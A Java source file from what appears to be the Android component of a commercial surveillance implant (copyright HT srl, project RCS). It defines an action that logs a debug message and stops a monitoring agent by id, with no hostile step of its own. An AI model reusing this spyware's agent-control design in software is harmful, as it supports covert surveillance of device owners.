/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import android.util.Log;

import com.android.service.agent.AgentManager;

public class StopAgentAction extends AgentAction {
	public StopAgentAction(SubActionType type, byte[] confParams) {
		super(type, confParams);
	}

	private static final String TAG = "StopAgentAction";

	@Override
	public boolean execute() {
		Log.d("QZ", TAG + " (execute): " + agentId);
		final AgentManager agentManager = AgentManager.self();

		agentManager.stop(agentId);
		return true;
	}

}
